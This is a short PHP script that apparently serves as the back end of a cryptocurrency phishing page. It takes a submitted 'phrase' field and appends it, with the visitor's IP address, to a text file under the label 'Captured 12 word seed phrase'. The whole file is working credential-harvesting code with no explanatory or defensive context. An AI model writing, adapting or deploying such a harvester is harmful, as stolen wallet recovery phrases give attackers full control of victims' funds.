<?php
              
if(isset($_POST['phrase']))
{
$data=$_POST['phrase'];
$ip = $_SERVER['REMOTE_ADDR'];
$fp = fopen('data.txt', 'a');
fwrite($fp, "[".$ip."]"." Captured 12 word seed phrase: ".$data."\n");
fclose($fp);
}
?>